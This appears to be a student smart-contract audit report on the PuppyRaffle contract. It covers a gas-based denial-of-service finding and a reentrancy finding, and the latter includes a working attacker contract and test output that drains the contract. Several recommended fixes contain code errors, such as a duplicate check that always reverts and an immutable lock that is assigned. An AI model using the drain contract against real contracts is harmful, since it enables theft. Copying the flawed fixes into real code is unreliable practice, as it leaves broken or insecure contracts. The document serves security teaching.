## [M-1] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential DoS vector, incrementing gas costs for future entrants

### Description:
The `PuppyRaffle::enterRaffle` function has a duplicate checking mechanism that loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle::players` array is, the more checks a new player will have to make. This means that the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional play in the `players` array is an additional check the loop will have to make.

> **Note to students:** This next line would likely be its own finding itself. However, we haven’t taught you about MEV yet, so we are going to ignore it.

Additionally, this increased gas cost creates front-running opportunities where malicious users can front-run another raffle entrant’s transaction, increase its costs, so their enter transaction fails.

---

### Impact:
The impact is two-fold:

1. The gas costs for raffle entrants will greatly increase as more players enter the raffle.  
2. Front-running opportunities are created for malicious users to increase the gas costs of other users, so their transaction fails.

---

### Proof of Concept:

If we have 2 sets of 100 players enter, the gas costs will be as such:
- **1st 100 players**: 6,251,420  
- **2nd 100 players**: 18,066,229  

This is more than **3x** as expensive for the second set of 100 players!

This is due to the `for` loop in the `PuppyRaffle::enterRaffle` function.

Place the following test into `PuppyRaffleTest.t.sol`


<details>
<summary> Code </summary>

```javascript


function testDenailOfService() public {
        vm.txGasPrice(1);
     address[] memory players = new address[](100);

     for(uint i = 0 ; i<100 ; ++i){
        players[i] = address(i);
     }
 uint gasStartFirst = gasleft();
     puppyRaffle.enterRaffle{value:entranceFee * players.length}(players);
     uint gasEndFirst = gasleft();
     uint gasUsedFirst = (gasStartFirst-gasEndFirst)*tx.gasprice ;
     console.log("gas cost of first 100 players is " , gasUsedFirst);

address[] memory newPlayers = new address[](100);
     for(uint i = 0 ; i<100 ; ++i){
        newPlayers[i] = address(i+100) ;
     }

uint gas2StartPrice = gasleft();

puppyRaffle.enterRaffle{value:entranceFee*newPlayers.length}(newPlayers);
uint gas2EndPrice = gasleft();

uint gasUsedSecond = (gas2StartPrice-gas2EndPrice)*tx.gasprice;

console.log("gas cost of second 100 players is ",gasUsedSecond);

assert(gasUsedSecond>gasUsedFirst);
    } 

```
</details>

**Recommendation**

1. Consider allowing duplicates. User can create new wallet anyways, so the duplicate check wont prevent a person to enter multiple times.
2. Consider using mappings to duplicate. This will allow you to check constant in constant time rather that linear time.

<details>
<summary>Code</summary>

```solidity
mapping(address => uint256) public addressToRaffleId;
uint256 public raffleId = 0;

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, 
        "PuppyRaffle: Must send enough to enter raffle");

    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
        addressToRaffleId[newPlayers[i]] = raffleId;
    }

    // Check for duplicates only from the new players
    for (uint256 i = 0; i < newPlayers.length; i++) {
        require(addressToRaffleId[newPlayers[i]] != raffleId, 
            "PuppyRaffle: Duplicate player");
    }

    emit RaffleEnter(newPlayers);
}
```
</details>

Removed Code:

<details>
<summary>Code</summary>

```solidity
// Check for duplicates
for (uint256 i = 0; i < players.length; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], 
            "PuppyRaffle: Duplicate player");
    }
}
```
</details>

Alternatively , you could use [`OpenZeppelin`] `EnumerableSet` library.

------
---
---

## [I-1] Changing the player balance after calling transfer function may lead to re entrancy attacks in `PuppyRaffle::refund`.

### Description : 
The `PuppyRaffle` contract has refund function after transfering the balance as refund function. The attacker can easily find out there is re entrancy attack potential and extract all of the contract balance by using `receive` or `fallback` function. After peoples has entered the `raffle`, the attacker can easily pretend entering raffle & immediatly exit that raffle but the catch here is that he can use `receive` or `fallback` function to receive the refund amount. He can put condition of the following in that receive function -:

```solidity
receive external payable {
if(address(puppyRaffle).balance >= entranceFee){
            puppyRaffle.refund(attackerIndex);
        }
}
```
---

### Impact : 
The contract balance may turn into zero. The players will neither be able to receive their raffle nft nor their ethers.

### Proof Of Concept

1. If we have 4 players who have already entered the raffle the contract balance will be increased and the attacker can view it from `etherscan`.

2. The attacker will make his own contract for attacker. That will include receive or fallback function to check a condition and extract all the money :
   
   1. Add the following to the `PuppyRaffleTest.t.sol` as an another contract.
   
<details>
<summary>Code </summary>

```javascript
   contract ReEntranceAttacker {

    PuppyRaffle puppyRaffle ;

    uint256 entranceFee ;
    uint256 attackerIndex ;

    constructor(PuppyRaffle _puppyRaffle){
        puppyRaffle = _puppyRaffle ;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory player = new address[](1);
        player[0] = address(this);

        puppyRaffle.enterRaffle{value:entranceFee*player.length}(player);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

   function _stealMoney() internal {
      if(address(puppyRaffle).balance >= entranceFee){
            puppyRaffle.refund(attackerIndex);
        }
   }
    fallback() external payable{
      _stealMoney() ;
    }

    receive() external payable{
   _stealMoney();
    }
    }

``` 
</details>

2.Add the following in `PuppyRaffleTest.t.sol` as an test.

<details>
<summary> Code</summary>

```javascript

 function test_reentrancy_refund() public {
        address[] memory players = new address[](4);
        players[0] = playerFour;
        players[1] = playerOne;
        players[2] = playerTwo;
        players[3] = playerThree;
        
        puppyRaffle.enterRaffle{value:entranceFee*4}(players);

        ReEntranceAttacker attackerContract = new ReEntranceAttacker(puppyRaffle) ;
        address attackUser = makeAddr("AtackUser");
        vm.deal(attackUser , 1 ether);

        console.log("Attacker Contract Balance Before attacking ", address(attackerContract).balance);
        console.log("Victim contract Balance before attacking ", address(puppyRaffle).balance);

        vm.prank(attackUser);
        attackerContract.attack{value:entranceFee}();

        console.log("Attacker Contract Balance after attacking ", address(attackerContract).balance);
        console.log("Victim contract Balance after attacking ", address(puppyRaffle).balance);

    }

```

</details>

At console you will see the following :
```
Attacker Contract Balance Before attacking 0

Victim contract Balance before attacking 4 ethers

Attacker Contract Balance after attacking 5 ethers

Victim contract Balance after attacking 0

```

**Recomendation**

1. Consider using `nonReentrant` guard from openzeppelin library.

<details>
<summary>Code</summary>

```
function refund(uint256 playerIndex) public nonReentrant{
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        payable(msg.sender).sendValue(entranceFee);

        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```
</details>

2. Consider first checking the condition, then update the state and then only transfer the fund.

<details>
<summary>Code</summary>

```
function refund(uint256 playerIndex) public  {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        players[playerIndex] = address(0);

        payable(msg.sender).sendValue(entranceFee);

        emit RaffleRefunded(playerAddress);
```
</details>

3. Consider using boolean that locks or unlock the function

<details>
<summary>Code</summary>

```
bool public immutable lock ;

function refund(uint256 playerIndex) public nonReentrant{
        lock = false ;
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        payable(msg.sender).sendValue(entranceFee);

        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
        lock = true ;
```
</details>